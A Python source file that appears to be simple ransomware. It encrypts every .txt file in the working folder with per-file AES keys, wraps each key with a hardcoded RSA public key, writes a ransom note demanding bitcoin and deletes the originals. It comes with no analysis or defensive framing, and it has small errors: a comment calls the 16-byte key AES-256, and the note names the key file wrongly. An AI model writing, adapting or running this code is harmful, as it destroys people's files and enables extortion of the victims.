import os
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad, unpad
from base64 import b64decode


#hardcoded public key
keypub= 'MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC5d/kUBCvkxf9CTULnGt8rXDblP84G6jRGGklwd47GlWUdaHJlz1cN/+t9b+MZE/63IeNU7HX3OXK06v9AY1l22qe0ug1Ij8beN3C1yIjgU5AtIThZ5q4sQTAp4cqsb83QuqJLrHvFUQBOfrYySNkHHQEdcX+bdMj5hs+fUp5f8wIDAQAB'
keyDER = b64decode(keypub)
pubkey = RSA.importKey(keyDER)


#generate a new symmetric key for each file
def generate_ransomm_id():
    return os.urandom(16)


#encrypt file with the given key and write to file
def encrypt_file(filename, key):
    with open(filename, "rb") as f:
        plaintext = f.read()


    #use AES-256 to encrypt the plaintext
    iv = os.urandom(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))


    #write encrypted file
    with open(filename + ".encrypted", "wb") as f:
        f.write(iv + ciphertext)

#encrypt the symmetric key with the public key and write
def encrypt_key(key, pubkey):
    cipher = PKCS1_OAEP.new(pubkey)
    ciphertext = cipher.encrypt(key)


    # write encrypted key to file
    with open(filename + ".ID", "wb") as f:
        f.write(ciphertext)

for filename in os.listdir():
    if filename.endswith(".txt"):
        # generate a new symmetric key for each file
        key = generate_ransomm_id()


        #encrypt file with the symmetric key
        encrypt_file(filename, key)


        #encrypt the symmetric key with the public key
        encrypt_key(key, pubkey)


        #write ransom note
        with open(filename + ".note", "w") as f:
            f.write("Your files have been encrypted!\n\n"
                    f"To get the decryption key and decrypt your files, send bitcoins to this address [example address]\n "
                    f"and send the identifier, {filename}.txt.ID , so I can send the decryption key.\n")


        #remove original file
        os.remove(filename)
